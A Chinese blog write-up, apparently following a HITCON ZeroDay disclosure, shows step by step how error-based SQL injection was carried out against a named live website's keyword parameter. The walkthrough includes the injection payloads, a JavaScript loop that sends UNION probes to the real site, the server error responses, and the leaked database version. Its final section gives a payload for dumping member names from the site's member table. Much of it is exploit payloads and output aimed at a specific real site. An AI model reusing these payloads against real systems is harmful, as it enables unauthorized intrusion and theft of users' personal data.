---
title: SQL Injection wowisee Success
description: SQL Injection wowisee Success
last_update:
  date: "2025-08-21T08:00:00+08:00"
---

本文是 https://zeroday.hitcon.org/vulnerability/ZD-2025-01030 的延伸

<!-- ## 先備知識

- 目標: `https://www.wowisee.com/list2.asp?keyword=`，keyword 是注入點
- 網站架構: Microsoft-IIS/8.5 + ASP.NET
- Server 會回傳 SQL Error Message
- 回傳的編碼是 Big5
- 可使用 Burp Suite 把 Hex 複製下來，再用 [hextostring](https://www.hextostring.com/) 轉換 -->

<!-- ## 測試過程

- 使用 Burp Suite Repeater 發送 HTTP Request
- queryString 的 value 使用我熟悉的 JS 來生成

```js
const sp = new URLSearchParams();
sp.append("keyword", `'`);
console.log(sp.toString().split("keyword=")[1]);
```

1. `%27`

```html
<font face="Arial" size="2">
  <p>Microsoft OLE DB Provider for SQL Server</p></font
>
<font face="Arial" size="2">錯誤 '80040e14'</font>
<p>
  <font face="Arial" size="2"
    >遺漏字元字串 ' Order By 上刊日期 desc' 後面的引號。</font
  >
</p>

<p>
  <font face="Arial" size="2">/app/Scripts/DataList.js</font
  ><font face="Arial" size="2">, 行308</font>
</p>
```

2. `%27--123`

成功查詢到，代表註解有成功

3. `%27+UNION+SELECT+NULL--123`

```html
<font face="Arial" size="2">
  <p>Microsoft OLE DB Provider for SQL Server</p></font
>
<font face="Arial" size="2">錯誤 '80040e14'</font>
<p>
  <font face="Arial" size="2"
    >使用 UNION、INTERSECT 或 EXCEPT
    運算子結合的所有查詢，其目標清單中的運算式數量必須相等。</font
  >
</p>

<p>
  <font face="Arial" size="2">/app/Scripts/DataList.js</font
  ><font face="Arial" size="2">, 行308</font>
</p>
```

接下來應該就是瘋狂 UNION 直到欄位相同？

3. `%27+UNION+SELECT+NULL%2CNULL--123`

```js
for (let i = 2; i < 100; i++) {
  const nulls = Array(i).fill("NULL").toString();
  const sp = new URLSearchParams();
  sp.append("keyword", `' UNION SELECT ${nulls}--123`);
  fetch(`https://www.wowisee.com/list2.asp?${sp.toString()}`, {
    referrerPolicy: "origin",
    credentials: "omit",
  }).then((res) => console.log(i, res.status));
}
```

真奇怪，到 100 個 NULL 都是同樣的錯誤訊息，只好改成用 Error-Based SQLi 來嘗試

4. `%27%3BSELECT+%27hello%27+WHERE+1+%3D+%28SELECT+%40%40version%29--123`

```html
<font face="Arial" size="2"> <p>ADODB.Recordset</p></font>
<font face="Arial" size="2">錯誤 '800a0cb3'</font>
<p>
  <font face="Arial" size="2"
    >目前資料錄集 (Recordset) 不支援書籤。這可能成為提供者或所選資料指標類型
    (cursortype) 的限制。</font
  >
</p>

<p>
  <font face="Arial" size="2">/app/Scripts/DataList.js</font
  ><font face="Arial" size="2">, 行432</font>
</p>
```

5. `%27+AND+CONVERT%28int%2C%40%40version%29--123`

```
<font face="Arial" size=2>
<p>Microsoft OLE DB Provider for SQL Server</font> <font face="Arial" size=2>錯誤 '80040e14'</font>
<p>
<font face="Arial" size=2>在有預期條件的內容中指定的非布林類型運算式，接近 ')'。</font>
<p>
<font face="Arial" size=2>/app/Scripts/DataList.js</font><font face="Arial" size=2>, 行308</font>
```

所以 AND 後面要接一個 Boolean 運算

6. `%27+AND+1+%3D+CONVERT%28int%2C%40%40version%29--123`

```html
<font face="Arial" size="2">
  <p>Microsoft OLE DB Provider for SQL Server</p></font
>
<font face="Arial" size="2">錯誤 '80040e07'</font>
<p>
  <font face="Arial" size="2"
    >將 nvarchar 值 'Microsoft SQL Server 2008 (SP4) - 10.0.6000.29 (X64) Sep 3
    2014 04:11:34 Copyright (c) 1988-2008 Microsoft Corporation Enterprise
    Edition (64-bit) on Windows NT 6.1 &lt;X64&gt; (Build 7601: Service Pack 1)
    ' 轉換成資料類型 int 時，轉換失敗。</font
  >
</p>

<p>
  <font face="Arial" size="2">/app/Scripts/DataList.js</font
  ><font face="Arial" size="2">, 行308</font>
</p>
```

成功提取到 MSSQL 的版本資訊，真詳細

```
Microsoft SQL Server 2008 (SP4) - 10.0.6000.29 (X64)
	Sep  3 2014 04:11:34
	Copyright (c) 1988-2008 Microsoft Corporation
	Enterprise Edition (64-bit) on Windows NT 6.1 &lt;X64&gt; (Build 7601: Service Pack 1)
```

7. 接下來請參考 [ZD-2025-01030](https://zeroday.hitcon.org/vulnerability/ZD-2025-01030) -->

## 學到的東西

1. 編碼轉換，可使用 [Hex to String Converter Online](https://www.hextostring.com/)
2. MSSQL 引出 SQLi Error Message 的方法

```sql
' AND 1 = CONVERT(int,(SELECT TOP 10 姓名 + '|' FROM 會員 FOR XML PATH('')))--123
```

3. 需要看 HTTP Response Hex 的時候，真的要用 Burp Suite 的 Repeater，超好用
